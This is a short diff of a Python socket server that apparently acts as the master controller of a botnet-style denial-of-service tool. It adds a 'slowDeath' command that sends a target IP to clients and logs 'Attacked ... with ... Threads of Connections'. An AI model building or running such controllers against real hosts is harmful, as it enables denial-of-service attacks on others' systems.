@@ -7,6 +7,7 @@ import time
 import datetime
 
 master='master'
+slowDeath = 'slowDeath'
 ping='slaveping'
 punch= "slavepunch"
 test = "slavetest"
@@ -70,7 +71,7 @@ def handler(clientsock,addr):
 			elif data == slowDeath:
 				clientsock.send(ipAdd)
 				time.sleep(1)
-				clientsock.send(threads)
+				#clientsock.send(threads)
 				time.sleep(1)
 				print >>sys.stderr, 'Attacked %s with %s Threads of Connections' % (ipAdd, threads)
 			else:
